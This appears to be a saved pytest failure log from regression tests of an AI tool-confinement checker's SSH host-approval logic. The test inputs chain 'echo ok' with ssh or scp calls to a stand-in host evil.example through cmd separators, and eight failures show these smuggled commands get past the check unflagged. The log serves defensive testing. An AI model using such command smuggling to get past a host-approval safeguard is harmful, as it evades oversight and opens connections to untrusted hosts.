@@ -1,0 +1,60 @@
+FFFFFFF...F                                                              [100%]
+=================================== FAILURES ===================================
+_ test_cmd_adjacent_separators_require_host_approval[echo ok&ssh -F none evil.example] _
+/evidence/round29_regressions.py:18: in test_cmd_adjacent_separators_require_host_approval
+    assert check_ssh_command_access(command,'review') is not None
+E   AssertionError: assert None is not None
+E    +  where None = check_ssh_command_access('echo ok&ssh -F none evil.example', 'review')
+_ test_cmd_adjacent_separators_require_host_approval[echo ok&&ssh -F none evil.example] _
+/evidence/round29_regressions.py:18: in test_cmd_adjacent_separators_require_host_approval
+    assert check_ssh_command_access(command,'review') is not None
+E   AssertionError: assert None is not None
+E    +  where None = check_ssh_command_access('echo ok&&ssh -F none evil.example', 'review')
+_ test_cmd_adjacent_separators_require_host_approval[echo ok|ssh -F none evil.example] _
+/evidence/round29_regressions.py:18: in test_cmd_adjacent_separators_require_host_approval
+    assert check_ssh_command_access(command,'review') is not None
+E   AssertionError: assert None is not None
+E    +  where None = check_ssh_command_access('echo ok|ssh -F none evil.example', 'review')
+_ test_cmd_adjacent_separators_require_host_approval[(echo ok)&ssh -F none evil.example] _
+/evidence/round29_regressions.py:18: in test_cmd_adjacent_separators_require_host_approval
+    assert check_ssh_command_access(command,'review') is not None
+E   AssertionError: assert None is not None
+E    +  where None = check_ssh_command_access('(echo ok)&ssh -F none evil.example', 'review')
+_ test_cmd_adjacent_separators_require_host_approval[echo ok&"ssh.exe" -F none evil.example] _
+/evidence/round29_regressions.py:18: in test_cmd_adjacent_separators_require_host_approval
+    assert check_ssh_command_access(command,'review') is not None
+E   assert None is not None
+E    +  where None = check_ssh_command_access('echo ok&"ssh.exe" -F none evil.example', 'review')
+_ test_cmd_adjacent_separators_require_host_approval[echo ok&scp -F none evil.example:/tmp/file copy] _
+/evidence/round29_regressions.py:18: in test_cmd_adjacent_separators_require_host_approval
+    assert check_ssh_command_access(command,'review') is not None
+E   AssertionError: assert None is not None
+E    +  where None = check_ssh_command_access('echo ok&scp -F none evil.example:/tmp/file copy', 'review')
+_ test_cmd_adjacent_separators_require_host_approval[cmd /c "echo ok&ssh -F none evil.example"] _
+/evidence/round29_regressions.py:18: in test_cmd_adjacent_separators_require_host_approval
+    assert check_ssh_command_access(command,'review') is not None
+E   assert None is not None
+E    +  where None = check_ssh_command_access('cmd /c "echo ok&ssh -F none evil.example"', 'review')
+_ test_cmd_quoted_and_escaped_separators_remain_data[echo ; ssh -F none evil.example] _
+/evidence/round29_regressions.py:30: in test_cmd_quoted_and_escaped_separators_remain_data
+    assert extract_ssh_hosts_from_command(command)==(set(),False)
+E   AssertionError: assert ({'evil.example'}, False) == (set(), False)
+E     
+E     At index 0 diff: {'evil.example'} != set()
+E     Use -v to get more diff
+=============================== warnings summary ===============================
+studio/backend/core/inference/tool_confinement.py:262
+  /work/studio/backend/core/inference/tool_confinement.py:262: DeprecationWarning: Due to '_pack_', the '_PathBeneathAttr' Structure will use memory layout compatible with MSVC (Windows). If this is intended, set _layout_ to 'ms'. The implicit default is deprecated and slated to become an error in Python 3.19.
+    class _PathBeneathAttr(ctypes.Structure):
+
+-- Docs: https://docs.pytest.org/en/stable/how-to/capture-warnings.html
+=========================== short test summary info ============================
+FAILED ../evidence/round29_regressions.py::test_cmd_adjacent_separators_require_host_approval[echo ok&ssh -F none evil.example]
+FAILED ../evidence/round29_regressions.py::test_cmd_adjacent_separators_require_host_approval[echo ok&&ssh -F none evil.example]
+FAILED ../evidence/round29_regressions.py::test_cmd_adjacent_separators_require_host_approval[echo ok|ssh -F none evil.example]
+FAILED ../evidence/round29_regressions.py::test_cmd_adjacent_separators_require_host_approval[(echo ok)&ssh -F none evil.example]
+FAILED ../evidence/round29_regressions.py::test_cmd_adjacent_separators_require_host_approval[echo ok&"ssh.exe" -F none evil.example]
+FAILED ../evidence/round29_regressions.py::test_cmd_adjacent_separators_require_host_approval[echo ok&scp -F none evil.example:/tmp/file copy]
+FAILED ../evidence/round29_regressions.py::test_cmd_adjacent_separators_require_host_approval[cmd /c "echo ok&ssh -F none evil.example"]
+FAILED ../evidence/round29_regressions.py::test_cmd_quoted_and_escaped_separators_remain_data[echo ; ssh -F none evil.example]
+8 failed, 3 passed, 1 warning in 0.14s
